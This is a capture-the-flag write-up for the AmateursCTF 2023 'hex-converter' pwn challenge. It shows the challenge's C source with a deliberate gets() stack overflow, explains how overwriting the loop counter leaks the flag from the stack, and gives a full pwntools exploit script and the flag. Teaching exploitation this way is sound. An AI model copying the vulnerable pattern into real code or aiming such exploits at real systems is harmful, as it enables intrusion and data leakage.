# AmateursCTF 2023

## hex-converter

> I kept on getting my hex mixed up while trying to solve unvariant's pwn challenges, so I wrote my own converter to help me out.
>
> Hint: What's in the stack that we can overwrite?
>
>  Author: stuxf
>
> [`chal.c`](chal.c) [`chal`](chal) [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution
This challenge comes with a binary plus source code. The code is small

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (i < 16)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));
        i++;
    }
    printf("\n");
}
```

Its easy to see that there is a potential buffer overflow when reading the `name` with `gets`. Its possible to override the counter `i` with a negative number so the loop will leak data that is located before the name array, which includes the flag.

```python
from pwn import *
import ctypes

binary = context.binary = ELF("./chal", checksec=False)

if args.REMOTE:
    p = remote("amt.rs", 31630)
else:
    p = process(binary.path)

payload = b""
payload += 28*b"A"
payload += p32(ctypes.c_uint(-80).value)

p.sendlineafter(b"convert to hex:", payload)
p.recvline()
buffer = p.recvline()[:-1].decode()
buffer.rjust((len(buffer)//2)*2, "0")
print(bytes.fromhex(buffer))
```

Flag `amateursCTF{arch1v3d_r1ght_b3f0r3_th3_start}`